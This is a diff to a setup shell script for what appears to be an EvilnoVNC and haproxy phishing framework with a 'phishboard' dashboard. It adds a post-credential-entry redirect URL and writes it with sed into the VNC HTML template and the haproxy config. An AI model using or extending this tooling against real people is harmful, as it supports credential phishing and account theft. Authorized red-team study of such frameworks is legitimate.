@@ -27,6 +27,9 @@ adminPort=1300
 cert="./certandkey.pem"
 #cert="/etc/letsencrypt/live/yourDomain/certandkey.pem"
 
+# Sitio de redirección posterior al ingreso de credenciales
+redirectURL="https://nivel4.com"
+
 # if timezone is different than Europe/Berlin, grep/sed through the files and adjust to your needs ;)
 # adjust error messages, e.g. haproxy/503.http
 
@@ -48,6 +51,7 @@ cfg="haproxy/haproxy.cfg"
 hrun="haproxy/run.sh"
 dash1="controller/src/phishboard/index.php"
 dash2="controller/src/phishboard/interact.php"
+evil_vnc_html="EvilnoVNC/Files/vnc_lite.html"
 
 
 ###############################################################
@@ -101,14 +105,17 @@ sed -i "s/---inst---/$instances/" $run
 
 ## build EvilnoVNC run.sh from template
 cp EvilnoVNC/run-template.sh $erun
+cp EvilnoVNC/vnc_lite-template.html $evil_vnc_html
 chmod +x $erun
 sed -i "s#---tUrl---#$tUrl#" $erun
+sed -i "s/-----REDIRECTURL-----/$redirectURL/" $evil_vnc_html
 
 ## build haproxy config from template
 cp haproxy/haproxy-template.cfg $cfg
 sed -i "s/---adminPass---/$adminPass/" $cfg
 sed -i "s/---accessToken---/$accessToken/" $cfg
 sed -i "s/---cookieKey---/$cookieKey/" $cfg
+sed -i "s/-----REDIRECTURL-----/$redirectURL/" $cfg
 
 ## build haproxy run script
 cp haproxy/run-template.sh $hrun
